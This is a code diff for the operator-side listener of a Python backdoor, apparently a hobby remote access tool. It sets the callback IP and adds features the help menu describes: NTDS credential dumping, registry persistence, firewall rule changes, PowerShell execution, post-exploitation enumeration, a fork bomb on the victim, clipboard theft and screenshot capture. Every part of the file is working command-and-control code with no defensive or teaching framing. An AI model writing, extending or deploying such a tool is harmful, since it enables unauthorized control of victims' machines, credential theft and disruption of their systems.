@@ -1,11 +1,11 @@
 #!/usr/bin/python
 import base64,json,socket,sys
 
-ip='127.0.0.1'
+ip='192.168.56.1' # can use noip dns
 print (ip)
 port = 6969
-global count
 
+# color codes..................
 red="\033[1;32;31m"
 green="\033[1;32;32m"
 yellow="\033[1;32;33m"
@@ -17,7 +17,7 @@ r="\x1b[0m"
 help = """
 \n
 ********************************************************************************
-* h -> print this help message                                                 *
+* help -> print this help message                                              *
 * cd ->  change directory                                                      *
 * pwd -> print current working directory                                       *
 * download [file name] -> download a file (not directory)                      *
@@ -30,12 +30,19 @@ help = """
 * chk  -> check if the system is a sandbox or VM                               *
 * clip -> dump clipboard                                                       *
 * fork -> run a fork bomb in victim machine                                    *
-* persistance -> set persistance using REGKEY (windows only)                   *
+* persistence -> set persistence using REGKEY (windows only)                   *
+* fw -> add firewall rules:  fw [in/out] [port number] [rule name]             *
+* ntds -> dump ntds  credential files in c:\windows\\temp                      *
+* powershell -> run the given powershell command or script                     *
+* enum -> run post-exploitation enumeration                                    *
+* q -> kill the backdoor                                                       *
+* exit  -> exit the listener                                                   *
 ********************************************************************************
 * ALL OTHER COMMANDS WILL BE EXECUTED AS SYSTEM SHELL COMMANDS                 *
 ********************************************************************************
  \n"""
 
+# main listener class and functions..............................................
 class listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -66,7 +73,7 @@ class listener:
             with open(path, "rb") as file:
                 return base64.b64encode(file.read())
         except :
-            return red,"[-] no such file or directory [-]",r
+            return "[-] no such file or directory [-]"
 
     def receive(self):
         json_data = ""
@@ -85,16 +92,29 @@ class listener:
         self.json_send(cmd)
         return self.receive()
 
+# filter and run the commands......................................................
     def run(self):
-
-        count = 1
+        shot_count = 1
+        enum_count = 1
 
         while True:
-            cmd = raw_input(">> ")
+            cmd = raw_input(str(ip)+" >> ")
             cmd=cmd.split(" ")
             try:
-                if cmd[0] == "h":
+                if cmd[0] == "help":
                     print cyan,help,r
+                    cmd[0] = ' '
+                elif cmd[0] == "q":
+                    while True:
+                        choice = raw_input("[!] are you sure(y/n) ?")
+                        if choice == "y":
+                            break
+                        elif choice == "n":
+                            cmd[0] = None
+                            break
+                        else:
+                            continue
+                    pass
                 elif cmd[0]=="upload" :
                     print blue,"[*] uploading ", str(cmd[1:]) , "...",r
                     file_content=self.read_file(cmd[1])
@@ -103,24 +123,36 @@ class listener:
                 if result == None:
                     pass
                 elif cmd[0]=="download":
-                    print blue,"[*] Downloading " , str(cmd[1:]) , "...",r
-                    result=self.write_file(cmd[1],result)
+                    print blue,"[*] Downloading " , ''.join(str(cmd[1])) , "...",r
+                    result = self.write_file(cmd[1],result)
                     print(result)
-                elif cmd[0] == "key-start":
-                    continue
                 elif cmd[0] == "shot":
-                    print blue,"[*] taking screenshot [*]",r
-                    name = "screenshot%s.png" % str(count)
+                    name = "screenshot%s.png" % str(shot_count)
                     result=self.write_file(name,result)
                     print green,"[+] screenshot captured [+]",r
-                    count +=1
+                    shot_count +=1
+                elif cmd[0] == "fw" and len(cmd) != 4:
+                    print red,"[!] usage: fw [in/out] [port number] [rule name] [!]",r
+                elif cmd[0] == "enum":
+                    name = "enum" + str(enum_count) + '.txt'
+                    try:
+                        result=self.write_file(name,result)
+                        print green,"[*] enumeration completed successfully, results saved to %s [*]" % name ,r
+                    except:
+                        print red,"[!] enumeration failed [!]"
+
+
+                    enum_count += 1
                 else:
+
                     print(result)
             except Exception:
                 result = Exception
-try:
-    starter = listener(ip, port)
-    starter.run()
-except KeyboardInterrupt:
-    print "exiting..."
-    sys.exit()
+
+if __name__ == '__main__':
+    try:
+        starter = listener(ip, port)
+        starter.run()
+    except KeyboardInterrupt:
+        sys.exit(0)
+
